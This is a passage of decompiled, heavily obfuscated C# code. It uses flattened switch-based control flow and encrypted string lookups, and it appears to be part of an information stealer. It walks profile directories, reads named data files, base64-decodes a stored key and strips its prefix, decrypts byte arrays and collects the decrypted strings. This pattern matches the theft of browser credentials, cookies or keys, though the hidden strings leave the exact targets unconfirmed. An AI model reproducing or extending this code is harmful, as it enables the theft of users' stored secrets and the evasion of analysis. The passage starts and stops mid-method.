					input6340 = list75 (node43, stack599, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6fb74606f6909232b9c"));
					num = 516731823;
					continue;
				}
				case 2u:
					return null;
				}
				break;
				IL_0088:
				num = ((num3 < array8361.Length) ? 274590265 : (--544157176));
				continue;
				IL_0063:
				num = (int)((input6340 == null) ? (num2 - 1596933275) : (num2 ^ 0x24E396FA));
			}
			goto IL_0006;
			IL_00a2:
			array8361 = current17;
			num = ~-2012986054;
			goto IL_000b;
		}

		private static string child5549 (string name07)
		{
			if (string.IsNullOrEmpty (name07)) {
				goto IL_000b;
			}
			goto IL_00c1;
			IL_000b:
			int num = -398769371;
			goto IL_0010;
			IL_0010:
			string text873 = default(string);
			string text874 = default(string);
			FileInfo fileInfo = default(FileInfo);
			while (true) {
				uint num2 = (uint)(num ^ -1211245086);
				switch (num2 % 9) {
				case 3u:
					break;
				default:
					num = -398769371;
					continue;
				case 2u:
					return null;
				case 8u:
					goto IL_0058;
				case 6u:
					goto IL_0082;
				case 0u:
					return null;
				case 4u:
					return null;
				case 7u:
					goto IL_00c1;
				case 5u:
					return null;
				case 1u:
					return text873;
				}
				break;
				IL_0082:
				text874 = rate91.level431 (fileInfo);
				num = (string.IsNullOrEmpty (text874) ? (~610486345) : (-590197157));
				continue;
				IL_0058:
				text873 = options800.status333 (text874, flag6144.0e291526dfde44109a60e580c474e7dd ("5a124329b52f56b0728b57ad00e189bf09f"));
				num = ((!string.IsNullOrEmpty (text873)) ? (-1223651797) : (-1306636897));
			}
			goto IL_000b;
			IL_00c1:
			fileInfo = new FileInfo (name07);
			num = (fileInfo.Exists ? (-1691533181) : (-174171112));
			goto IL_0010;
		}

		private static byte[] next74 (string settings4653)
		{
			string text873 = options800.status333 (settings4653, flag6144.0e291526dfde44109a60e580c474e7dd ("1e9463ef0f79dbb350888f847020315dca362cabdb766d99e8e628fee"));
			byte[] array8361 = default(byte[]);
			while (true) {
				int num = -1194535250;
				while (true) {
					uint num2 = (uint)(num ^ -1657563297);
					switch (num2 % 6) {
					case 0u:
						break;
					default:
						num = -1194535250;
						continue;
					case 1u:
						num = ((!string.IsNullOrEmpty (text873)) ? ((int)(0 - num2) + -788075240) : ((int)(0 - num2 + 189575346)));
						continue;
					case 3u:
						return null;
					case 2u:
						return null;
					case 4u:
						array8361 = Convert.FromBase64String (text873);
						num = ((array8361.Length <= flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("aee53f5c039e80b2512")) ? (-702011276) : (-1954836308));
						continue;
					case 5u:
						return array8361.Skip (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9b95a8c81d0fd505e9")).ToArray ();
					}
					break;
				}
			}
		}

		private static string current4886 (row24 left53)
		{
			string text873 = cell442 (left53, flag6144.0e291526dfde44109a60e580c474e7dd ("e90757016651c3914d569214af9ba86f5")) ?? cell442 (left53, flag6144.0e291526dfde44109a60e580c474e7dd ("504a6775f5943992b655a8b40cd17dce6a8f0c69d"));
			if (string.IsNullOrEmpty (text873)) {
				goto IL_002d;
			}
			goto IL_008a;
			IL_008a:
			FileInfo fileInfo = new FileInfo (text873);
			int num = ~1134081475;
			goto IL_0032;
			IL_0032:
			while (true) {
				uint num2;
				switch ((num2 = (uint)(num ^ -2086888984)) % 6) {
				case 3u:
					break;
				default:
					num = -1277983813;
					continue;
				case 0u:
					return null;
				case 2u:
					goto IL_006c;
				case 4u:
					goto IL_008a;
				case 5u:
					return null;
				case 1u:
					return rate91.level431 (fileInfo);
				}
				break;
				IL_006c:
				num = (int)((!fileInfo.Exists) ? ((0 - num2) ^ 0x590FB0CE) : (~num2 + 1029289880));
			}
			goto IL_002d;
			IL_002d:
			num = -1277983813;
			goto IL_0032;
		}

		private static string position33 (row24 config40, string graph446)
		{
			string text873 = options800.status333 (graph446, flag6144.0e291526dfde44109a60e580c474e7dd ("6af4a8944cfe3c779522ade94e60a13fb9c"));
			string text874 = default(string);
			FileInfo fileInfo = default(FileInfo);
			string text875 = default(string);
			while (true) {
				int num = -49821254;
				while (true) {
					uint num2 = (uint)(num ^ -98739338);
					switch (num2 % 13) {
					case 5u:
						break;
					default:
						num = -49821254;
						continue;
					case 4u:
						num = ((!string.IsNullOrEmpty (text873)) ? ((int)(0 - num2) + -1139731874) : ((int)(num2 - 411530944)));
						continue;
					case 0u:
						num = ((!string.IsNullOrEmpty (text874)) ? ((int)num2 - -1423053391) : ((int)num2 + -1925490882));
						continue;
					case 7u:
						return settings54.cache19 (text874);
					case 2u:
						text874 = rate91.level431 (fileInfo);
						num = ~1498951322;
						continue;
					case 3u:
						num = ((!string.IsNullOrEmpty (text875)) ? ((int)(~num2) + -1373407719) : ((int)((0 - num2) ^ 0x700691FD)));
						continue;
					case 11u:
						text875 = cell442 (config40, flag6144.0e291526dfde44109a60e580c474e7dd ("46286564305b4ac908e28b7bfb9ef3c659c"));
						num = (int)(num2 - 884540200);
						continue;
					case 8u:
						return null;
					case 1u:
						return null;
					case 10u:
						return null;
					case 12u:
						fileInfo = new FileInfo (text875);
						num = -775348587;
						continue;
					case 6u:
						num = ((!fileInfo.Exists) ? ((int)num2 - -1556292534) : ((int)(num2 - 1836561743)));
						continue;
					case 9u:
						return text873;
					}
					break;
				}
			}
		}

		private static string error7926 (row24 file264)
		{
			string text873 = cell442 (file264, flag6144.0e291526dfde44109a60e580c474e7dd ("4493d071b1345563c8c46a2694099d51b9d"));
			if (string.IsNullOrEmpty (text873)) {
				goto IL_0019;
			}
			goto IL_0080;
			IL_0019:
			int num = -1563946765;
			goto IL_001e;
			IL_001e:
			string text874 = default(string);
			FileInfo fileInfo = default(FileInfo);
			while (true) {
				uint num2 = (uint)(num + -796413577);
				switch (num2 % 8) {
				case 7u:
					break;
				default:
					num = -1563946765;
					continue;
				case 3u:
					return null;
				case 4u:
					goto IL_0061;
				case 6u:
					goto IL_0080;
				case 1u:
					return null;
				case 0u:
					goto IL_009a;
				case 2u:
					return null;
				case 5u:
					return settings54.cache19 (text874);
				}
				break;
				IL_009a:
				num = (fileInfo.Exists ? ((int)num2 - -1887782173) : ((int)(num2 ^ 0x59E5387C)));
				continue;
				IL_0061:
				text874 = rate91.level431 (fileInfo);
				num = ((!string.IsNullOrEmpty (text874)) ? 1632280942 : 1032214674);
			}
			goto IL_0019;
			IL_0080:
			fileInfo = new FileInfo (text873);
			num = 797913345;
			goto IL_001e;
		}

		private static string cell442 (row24 text6560, string temp417)
		{
			string text6561 = Path.Combine (text6560.date30.FullName, temp417);
			string text6562 = default(string);
			string result = default(string);
			while (true) {
				int num = -377519709;
				while (true) {
					uint num2 = (uint)(num ^ -912974242);
					switch (num2 % 4) {
					case 2u:
						break;
					default:
						num = -377519709;
						continue;
					case 1u:
						num = ((!File.Exists (text6561)) ? ((int)num2 + -2038673408) : ((int)(0 - num2 + 439384807)));
						continue;
					case 0u:
						return text6561;
					case 3u: {
						using (List<width422>.Enumerator enumerator = text6560.format5368.GetEnumerator ()) {
							while (true) {
								IL_00bd:
								int num3 = ((!enumerator.MoveNext ()) ? (-1316591043) : (-1358121952));
								while (true) {
									num2 = (uint)(num3 - 1066968449);
									switch (num2 % 6) {
									case 3u:
										num3 = ~1358121951;
										continue;
									default:
										num3 = -1358121952;
										continue;
									case 5u:
										break;
									case 1u:
										text6562 = Path.Combine (enumerator.Current.column158.FullName, temp417);
										num3 = ((!File.Exists (text6562)) ? (--1576597150) : 1990611515);
										continue;
									case 0u:
										result = text6562;
										num3 = (int)(~num2 ^ 0x54889EF2);
										continue;
									case 2u:
										goto end_IL_007f;
									case 4u:
										return result;
									}
									goto IL_00bd;
									continue;
									end_IL_007f:
									break;
								}
								break;
							}
						}
						return null;
					}
					}
					break;
				}
			}
		}
	}
}
namespace size310
{
	public class stream798
	{
		public static List<stack598> source3621 (IEnumerable<settings7294> line455)
		{
			List<stack598> list839 = new List<stack598> ();
			using IEnumerator<settings7294> enumerator = line455.GetEnumerator ();
			stack598 stack599 = default(stack598);
			FileInfo current616 = default(FileInfo);
			input6339 input6340 = default(input6339);
			while (true) {
				IL_0264:
				if (enumerator.MoveNext ()) {
					settings7294 current615;
					byte[] array8362;
					while (true) {
						current615 = enumerator.Current;
						string fullName = current615.end3857.FullName;
						string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2e9227489d509c5985e")];
						array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("2f9f2ab37eb2a33edc3df70686857ad6d");
						array8362 = stream0639 (position151.child530 (fullName, array8361));
						int num = -115827767;
						while (true) {
							uint num2;
							switch ((num2 = (uint)(num ^ -589146313)) % 4) {
							case 3u:
								num = ~1338365605;
								continue;
							default:
								num = -1338365606;
								continue;
							case 1u:
								break;
							case 2u:
								goto IL_0081;
							case 0u:
								goto end_IL_0040;
							}
							break;
							IL_0081:
							if (array8362 != null) {
								num = (int)(0 - num2 + 268271045);
								continue;
							}
							goto IL_0264;
						}
						continue;
						end_IL_0040:
						break;
					}
					stack599 = new stack598 {
						cache7392 = array8362
					};
					string fullName2 = current615.end3857.FullName;
					string[] array8363 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bd4de7682c90948aa79")];
					array8363 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("475a50d69983b2a964e65491aa1f533d0169d");
					array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3c91c2ab78b9cabda37")] = flag6144.0e291526dfde44109a60e580c474e7dd ("0c9693ce0831b51482345c742");
					using (IEnumerator<FileInfo> enumerator2 = new status423 (position151.child530 (fullName2, array8363)).rate98.GetEnumerator ()) {
						while (true) {
							IL_0184:
							int num3 = (enumerator2.MoveNext () ? 278467011 : (~-1529159210));
							while (true) {
								uint num2;
								switch ((num2 = (uint)(num3 ^ 0x14196384)) % 8) {
								case 0u:
									num3 = 278467011;
									continue;
								default:
									num3 = 278467011;
									continue;
								case 7u:
									current616 = enumerator2.Current;
									num3 = ((!current616.Name.EndsWith (flag6144.0e291526dfde44109a60e580c474e7dd ("9c04ce9eca9abcadad2"))) ? 804410725 : (~-2016137583));
									continue;
								case 6u:
									stack599.count32.Add (input6340);
									num3 = (int)(~num2) ^ -1594105852;
									continue;
								case 1u:
									break;
								case 3u:
									num3 = ((input6340 == null) ? ((int)(num2 - 193640534)) : ((int)num2 - -1097501189));
									continue;
								case 4u:
									num3 = ((input6340.position632 == 0L) ? ((int)num2 + -957128415) : ((int)(num2 ^ 0xC11DD5E)));
									continue;
								case 2u:
									input6340 = rate91.context9200 (current616.FullName, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1c9051c27b8c3734bb9"));
									num3 = (int)(0 - num2) ^ -1129766103;
									continue;
								case 5u:
									goto end_IL_00fe;
								}
								goto IL_0184;
								continue;
								end_IL_00fe:
								break;
							}
							break;
						}
					}
					if (stack599.count32.Count <= 0) {
						continue;
					}
					goto IL_0223;
				}
				int num4 = -705753456;
				goto IL_0228;
				IL_0223:
				num4 = -1061964214;
				goto IL_0228;
				IL_0228:
				while (true) {
					uint num2 = (uint)(num4 ^ -1410932555);
					switch (num2 % 4) {
					case 0u:
						break;
					default:
						num4 = -1061964214;
						continue;
					case 3u:
						list839.Add (stack599);
						num4 = (int)(~num2 + 1394479859);
						continue;
					case 2u:
						goto IL_0264;
					case 1u:
						return list839;
					}
					break;
				}
				goto IL_0223;
			}
		}

		private static byte[] stream0639 (string speed586)
		{
			FileInfo fileInfo = new FileInfo (speed586);
			if (!fileInfo.Exists) {
				goto IL_000f;
			}
			goto IL_004f;
			IL_000f:
			int num = -1450003477;
			goto IL_0014;
			IL_0014:
			string text873 = default(string);
			while (true) {
				uint num2 = (uint)(num + 1676818686);
				switch (num2 % 6) {
				case 0u:
					break;
				default:
					num = -1450003477;
					continue;
				case 5u:
					return null;
				case 2u:
					goto IL_004f;
				case 4u:
					return null;
				case 1u:
					goto IL_0069;
				case 3u:
					return total94.size17 (text873);
				}
				break;
				IL_0069:
				num = ((!string.IsNullOrEmpty (text873)) ? ((int)num2 + -2073179542) : ((int)(~num2 ^ 0x3A6DAEA4)));
			}
			goto IL_000f;
			IL_004f:
			text873 = rate91.level431 (fileInfo);
			num = --215869111;
			goto IL_0014;
		}
	}
}
namespace parent10
{
	public class column55
	{
		public static score746 target3943 (stream8120 next56, list47 dict259 = null)
		{
			row9445 page = state22 (dict259, next56.width021, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3f9d568f7ccaf9ee13d"));
			row9445 column715 = state22 (dict259, next56.config071, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f96541e063f466cb7ba"));
			row9445 child = state22 (dict259, next56.child48, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9c6e2ab7af604a1b20"));
			return new score746 {
				error15 = next56.next2236,
				key372 = page,
				page312 = column715,
				temp09 = child
			};
		}

		private static row9445 state22 (list47 stream766, DirectoryInfo session978, int amount0412 = int.MaxValue)
		{
			if (session978 != null) {
				FileInfo current615 = default(FileInfo);
				byte[] array8361 = default(byte[]);
				input6339 input6340 = default(input6339);
				row9445 row9447 = default(row9445);
				while (true) {
					int num = --450942539;
					while (true) {
						uint num2 = (uint)(-num + 1009891767);
						switch (num2 % 6) {
						case 0u:
							break;
						default:
							num = 450942539;
							continue;
						case 4u:
							goto IL_003b;
						case 2u:
							goto end_IL_0003;
						case 3u:
							goto IL_0062;
						case 5u:
							return rate91.path295 (session978, amount0412);
						case 1u: {
							row9445 row9446 = new row9445 (session978);
							using (IEnumerator<FileInfo> enumerator = status423.id560 (session978).GetEnumerator ()) {
								while (true) {
									IL_0147:
									if (enumerator.MoveNext ()) {
										current615 = enumerator.Current;
										array8361 = null;
										try {
											array8361 = stream766.current29 (current615.FullName, amount0412, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c901106392cebd19b48"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9ad9efc88dce34d32b"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4388648da9fbc853d9c"));
										} catch {
										}
										if (array8361 != null) {
											goto IL_00df;
										}
										goto IL_015a;
									}
									int num3 = --29844524;
									goto IL_00e5;
									IL_015a:
									input6340 = rate91.context9200 (current615.FullName, amount0412);
									num3 = --1331730798;
									goto IL_00e5;
									IL_00e5:
									while (true) {
										switch ((num2 = (uint)(num3 ^ 0x5A1AB38A)) % 9) {
										case 7u:
											break;
										default:
											num3 = 2087786106;
											continue;
										case 4u:
											goto IL_0122;
										case 6u:
											num3 = (int)(~num2) ^ -455330328;
											continue;
										case 5u:
											goto IL_0147;
										case 1u:
											goto IL_015a;
										case 2u:
											goto IL_0173;
										case 8u:
											row9446.level867 (new input6339 (current615, array8361));
											num3 = (int)(~num2 + 1726017522);
											continue;
										case 3u:
											row9446.level867 (input6340);
											num3 = (int)(0 - num2) + -1394976109;
											continue;
										case 0u:
											goto end_IL_0147;
										}
										break;
										IL_0173:
										num3 = ((input6340 == null) ? ((int)(0 - num2) ^ -1737997665) : ((int)(~num2) ^ -1988909695));
										continue;
										IL_0122:
										num3 = ((array8361.Length == 0) ? ((int)num2 - -710836631) : ((int)(num2 + 1118506089)));
									}
									goto IL_00df;
									IL_00df:
									num3 = --2087786106;
									goto IL_00e5;
									continue;
									end_IL_0147:
									break;
								}
							}
							using IEnumerator<DirectoryInfo> enumerator2 = status423.args3354 (session978).GetEnumerator ();
							while (true) {
								int num4 = (enumerator2.MoveNext () ? (-1081907430) : (-1347329657));
								while (true) {
									switch ((num2 = (uint)(num4 ^ -600194006)) % 6) {
									case 0u:
										num4 = -1081907430;
										continue;
									default:
										num4 = -1081907430;
										continue;
									case 5u:
										break;
									case 3u:
										row9446.dir16 (row9447);
										num4 = (int)(~num2 + 752928339);
										continue;
									case 2u:
										num4 = (int)((row9447 == null) ? (0 - num2 + 27504139) : (num2 + 1466129453));
										continue;
									case 4u: {
										DirectoryInfo current616 = enumerator2.Current;
										row9447 = state22 (stream766, current616, amount0412);
										num4 = -211194358;
										continue;
									}
									case 1u:
										return row9446;
									}
									break;
								}
							}
						}
						}
						break;
						IL_0062:
						num = ((stream766 != null) ? (-404234974) : (-759377636));
						continue;
						IL_003b:
						num = (session978.Exists ? ((int)num2 - -190673132) : ((int)(num2 ^ 0x33AFB385)));
					}
					continue;
					end_IL_0003:
					break;
				}
			}
			return null;
		}
	}
}
namespace item638
{
	public class mode66
	{
		public static temp615 item87 (row24 status54)
		{
			temp615 temp616 = new temp615 {
				parent89 = status54.index144,
				flag83 = status54.date30.FullName
			};
			using List<width422>.Enumerator enumerator = status54.format5368.GetEnumerator ();
			width422 current615 = default(width422);
			string fullName = default(string);
			mode580 item4707 = default(mode580);
			while (true) {
				int num = (enumerator.MoveNext () ? (-653552282) : (-343352972));
				while (true) {
					uint num2 = (uint)(-num ^ 0x4F276002);
					switch (num2 % 7) {
					case 2u:
						num = -653552282;
						continue;
					default:
						num = -653552282;
						continue;
					case 5u:
						current615 = enumerator.Current;
						num = -1549050437;
						continue;
					case 6u:
						break;
					case 4u:
						fullName = current615.column158.FullName;
						num = (int)num2 ^ -1791159587;
						continue;
					case 0u: {
						string stream8121 = Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("0e9a9cbd0c79180bc37ce453f776f17b91e39e4dcb44a72"));
						string stream8122 = Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("2f9f958cb089983fc7909e37154580450eebc"));
						string stream8123 = Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("e966cf2f452a8fac89e9d70a6bc74360ea7031f"));
						string stream8124 = Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("9eedb9882e38679e591948663cd14e6f3"));
						string stream8125 = Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("3f9f8d0d46fb81b3fc0714f7b"));
						input6339 page = rate91.context9200 (stream8123, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8c143ecb6191b3f1dae"));
						input6339 color = rate91.context9200 (stream8124, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("75df6e08a5a4f106d9f"));
						input6339 start8303 = rate91.context9200 (stream8125, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7306b28485b69114b9d"));
						input6339 rate92 = rate91.context9200 (stream8121, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5a2447ffec19bcb869f"));
						input6339 stream8126 = rate91.context9200 (stream8122, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3d9d47605d6e40f3e66"));
						item4707 = new mode580 {
							rate84 = current615.source238,
							list5587 = color,
							previous7756 = start8303,
							time61 = page,
							text80 = rate92,
							name985 = fullName,
							end2978 = stream8126
						};
						num = (int)(num2 - 1730801969);
						continue;
					}
					case 3u:
						temp616.input94.Add (item4707);
						num = (int)(num2 + 614642288);
						continue;
					case 1u:
						return temp616;
					}
					break;
				}
			}
		}
	}
}
namespace cell897
{
	public class stream81
	{
		private static string buffer55 ()
		{
			string height = position291.price61;
			string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5507588082c4416999d")];
			array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("e99652c3febf6a70b2523");
			array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ac1fb590a49bb0adf2c")] = flag6144.0e291526dfde44109a60e580c474e7dd ("2c94684e5ccac730b28cf13d4838b");
			array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d922633360f01abbe6d")] = flag6144.0e291526dfde44109a60e580c474e7dd ("f96be2ea4593a6039bf91b473c7471072ae");
			FileInfo fileInfo = new FileInfo (position151.child530 (height, array8361));
			string text873 = default(string);
			while (true) {
				int num = 341398613;
				while (true) {
					uint num2 = (uint)(num + -260610333);
					switch (num2 % 6) {
					case 0u:
						break;
					default:
						num = 341398613;
						continue;
					case 4u:
						text873 = rate91.level431 (fileInfo);
						num = ((!string.IsNullOrEmpty (text873)) ? (~-568246631) : (~1961046595));
						continue;
					case 5u:
						return null;
					case 2u:
						num = ((!fileInfo.Exists) ? ((int)num2 - -738403900) : ((int)(num2 + 1798665335)));
						continue;
					case 3u:
						return null;
					case 1u:
						return settings54.cache19 (text873);
					}
					break;
				}
			}
		}

		public static List<string> config337 (List<byte[]> number0687, List<byte[]> state25)
		{
			List<string> list839 = new List<string> ();
			if (number0687 != null) {
				byte[] current616 = default(byte[]);
				string text873 = default(string);
				byte[] array8361 = default(byte[]);
				while (true) {
					int num = ~638613900;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num + 1686483818)) % 6) {
						case 0u:
							break;
						default:
							num = -638613901;
							continue;
						case 4u:
							goto IL_0042;
						case 3u:
							goto IL_0060;
						case 1u:
							goto IL_0080;
						case 2u:
							goto end_IL_000c;
						case 5u: {
							foreach (byte[] item in number0687) {
								using List<byte[]>.Enumerator enumerator2 = state25.GetEnumerator ();
								while (true) {
									IL_0175:
									int num3 = ((!enumerator2.MoveNext ()) ? (-1884113704) : (--1681938343));
									while (true) {
										switch ((num2 = (uint)(~num3 + -534125004)) % 10) {
										case 2u:
											num3 = 1681938343;
											continue;
										default:
											num3 = 1681938343;
											continue;
										case 8u:
											current616 = enumerator2.Current;
											num3 = 1771606351;
											continue;
										case 5u:
											num3 = (int)(text873.StartsWith (flag6144.0e291526dfde44109a60e580c474e7dd ("2d916df1173dee1"), (StringComparison)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6290cedebd05deab09c")) ? (~num2 ^ 0x640112E4) : (num2 + 855450782));
											continue;
										case 1u:
											num3 = (int)((array8361.Length != 0) ? (0 - num2 + 169755009) : (num2 + 994343136));
											continue;
										case 4u:
											break;
										case 7u:
											text873 = Encoding.UTF8.GetString (array8361);
											num3 = (int)((0 - num2) ^ 0x5217CF6D);
											continue;
										case 3u:
											list839.Add (text873);
											num3 = (int)(~num2) + -1381671475;
											continue;
										case 0u:
											array8361 = stack564.start642 (item, current616);
											num3 = (int)num2 ^ -1609282661;
											continue;
										case 6u:
											num3 = ((array8361 == null) ? ((int)(~num2) ^ -1738478078) : ((int)num2 ^ -1533656706));
											continue;
										case 9u:
											goto end_IL_00cd;
										}
										goto IL_0175;
										continue;
										end_IL_00cd:
										break;
									}
									break;
								}
							}
							return list839;
						}
						}
						break;
						IL_0080:
						num = ((state25 == null) ? ((int)num2 ^ -600929813) : ((int)num2 + -1225192074));
						continue;
						IL_0060:
						num = ((number0687.Count == 0) ? ((int)(~num2 + 1011854068)) : ((int)(~num2) ^ -1305931330));
						continue;
						IL_0042:
						num = ((state25.Count == 0) ? ((int)num2 - -1773201360) : ((int)num2 - -805568499));
					}
					continue;
					end_IL_000c:
					break;
				}
			}
			return list839;
		}

		public static List<input6339> index4458 ()
		{
			List<input6339> list839 = new List<input6339> ();
			string text873 = default(string);
			string text874 = default(string);
			input6339 input6342 = default(input6339);
			string stream8122 = default(string);
			input6339 input6340 = default(input6339);
			string stream8121 = default(string);
			input6339 input6341 = default(input6339);
			while (true) {
				int num = 666064403;
				while (true) {
					uint num2 = (uint)((num ^ -261236947) - -863481184);
					switch (num2 % 18) {
					case 7u:
						break;
					default:
						num = 666064403;
						continue;
					case 9u:
						text873 = start9974 (text874);
						num = --115557221;
						continue;
					case 6u:
						return list839;
					case 0u:
						list839.Add (input6342);
						num = (int)num2 + -588975289;
						continue;
					case 1u:
						input6342 = rate91.context9200 (stream8122, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5504bcbb344340e169e"));
						num = (int)(num2 ^ 0x5BDBF336);
						continue;
					case 16u:
						list839.Add (input6340);
						num = (int)((0 - num2) ^ 0x7F8E5CDC);
						continue;
					case 4u: {
						string height2 = text873;
						string[] array8362 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("54e8098390dcc17869f")];
						array8362 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("bf156e70d6c1922d9919613");
						array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1c9b2c21963ab20ef7f")] = flag6144.0e291526dfde44109a60e580c474e7dd ("e9b1f9973e8278364aadec4124be524e3ae8e7e");
						stream8121 = position151.child530 (height2, array8362);
						num = (int)(0 - num2 + 82076420);
						continue;
					}
					case 13u:
						list839.Add (input6341);
						num = (int)num2 + -211461665;
						continue;
					case 8u:
						num = ((!string.IsNullOrEmpty (text873)) ? ((int)num2 + -889617052) : ((int)(0 - num2 + 1327955992)));
						continue;
					case 15u:
						num = ((input6342 == null) ? 597001241 : (-480955297));
						continue;
					case 10u:
						text874 = buffer55 ();
						num = (int)(~num2 ^ 0x11060EE4);
						continue;
					case 2u:
						num = (int)((!string.IsNullOrEmpty (text874)) ? (~num2 + 846418161) : (num2 + 1845185951));
						continue;
					case 5u: {
						string height3 = text873;
						string[] array8363 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d927669f08d77dd5425")];
						array8363 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("413c44dc45bb5e9a052579d");
						array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("74223cdb54f9855229e")] = flag6144.0e291526dfde44109a60e580c474e7dd ("e9b00ffa59c91f31c77e32145e8393f");
						stream8122 = position151.child530 (height3, array8363);
						num = 352921939;
						continue;
					}
					case 12u:
						num = ((input6340 == null) ? (-242254492) : (~823466042));
						continue;
					case 11u: {
						string height = position291.price61;
						string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c96b2a3716db8123162")];
						array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("e95793ddbd0d978d22d67");
						array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9ac1d583acb61ca402")] = flag6144.0e291526dfde44109a60e580c474e7dd ("3c99fca4a7ee55d89d461b5337fde");
						input6341 = rate91.context9200 (position151.child530 (height, array8361), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8e9cb66d3895b7ffa15"));
						num = (int)num2 + -1852380055;
						continue;
					}
					case 17u:
						return list839;
					case 14u:
						input6340 = rate91.context9200 (stream8121, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0d9357517d149384084"));
						num = ((input6341 == null) ? ((int)(num2 ^ 0x1D5BF862)) : ((int)num2 + -961618934));
						continue;
					case 3u:
						return list839;
					}
					break;
				}
			}
		}

		private static string start9974 (string format807)
		{
			try {
				string directoryName = Path.GetDirectoryName (format807);
				string result = default(string);
				while (true) {
					IL_0007:
					int num = -207921447;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num + 1757579960)) % 8) {
						case 2u:
							break;
						default:
							num = -207921447;
							continue;
						case 7u:
							num = ((!string.IsNullOrEmpty (directoryName)) ? (-559017344) : (-204254197));
							continue;
						case 5u:
							result = directoryName;
							num = (int)num2 ^ -1395207135;
							continue;
						case 0u:
							num = ((!Directory.Exists (Path.Combine (directoryName, flag6144.0e291526dfde44109a60e580c474e7dd ("48436c871691fccf077079c")))) ? 202231198 : (~1247243546));
							continue;
						case 6u:
							directoryName = Path.GetDirectoryName (directoryName);
							num = -243385465;
							continue;
						case 1u:
							num = (int)(0 - num2 + 1306273048);
							continue;
						case 3u:
							goto end_IL_000c;
						case 4u:
							return result;
						}
						goto IL_0007;
						continue;
						end_IL_000c:
						break;
					}
					break;
				}
			} catch {
			}
			return string.Empty;
		}
	}
}
namespace limit9216
{
	public class output088
	{
		[CompilerGenerated]
		private sealed class <>c__DisplayClass3_0
		{
			public FileInfo file;

			internal bool index00 (string child5146)
			{
				return file.Name.Contains (child5146);
			}
		}

		[CompilerGenerated]
		private sealed class <>c__DisplayClass4_0
		{
			public string normalizedName;

			internal bool context319 (status423 line8782)
			{
				return line8782.path1429.Name == normalizedName;
			}
		}

		public static List<number121> list8986 (IEnumerable<settings7294> source8258)
		{
			List<number121> list839 = new List<number121> ();
			using List<settings7294>.Enumerator enumerator = (from settings7295 in source8258.Concat (dir2299 ()).Concat (stack14 ())
				group settings7295 by settings7295.end3857.FullName into color0686
				select color0686.First ()).ToList ().GetEnumerator ();
			number121 number122 = default(number121);
			while (true) {
				int num = ((!enumerator.MoveNext ()) ? (~-450681792) : 994767269);
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + -367336185)) % 5) {
					case 2u:
						num = 994767269;
						continue;
					default:
						num = 994767269;
						continue;
					case 4u:
						number122 = price15 (enumerator.Current);
						num = ((number122 == null) ? (--1414907253) : 564963590);
						continue;
					case 0u:
						list839.Add (number122);
						num = (int)(num2 ^ 0x5F924B78);
						continue;
					case 3u:
						break;
					case 1u:
						return list839;
					}
					break;
				}
			}
		}

		private static number121 price15 (settings7294 data2794)
		{
			status423 status747 = new status423 (data2794.end3857.FullName, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9cd7c3a61c12b8d562"));
			List<string> list839 = amount51 (status747);
			number121 number122 = default(number121);
			List<string> number123 = default(List<string>);
			while (true) {
				int num = ~-1774558491;
				while (true) {
					uint num2 = (uint)(num - 1635455123);
					switch (num2 % 10) {
					case 4u:
						break;
					default:
						num = 1774558490;
						continue;
					case 6u:
						num = ((number122.line32.Count != 0) ? ((int)num2 ^ -1035354914) : ((int)num2 - -130720800));
						continue;
					case 2u:
						return null;
					case 8u:
						min5500 (number122, status747, number123);
						num = (int)(0 - num2) ^ -248564002;
						continue;
					case 7u:
						num = ((list839.Count != 0) ? ((int)num2 + -1908925205) : ((int)(0 - num2) + -1256696744));
						continue;
					case 3u:
						return null;
					case 9u:
						num = ((number122.id322.Count == 0) ? ((int)num2 + -1233392916) : ((int)(~num2 ^ 0x48B76D86)));
						continue;
					case 5u:
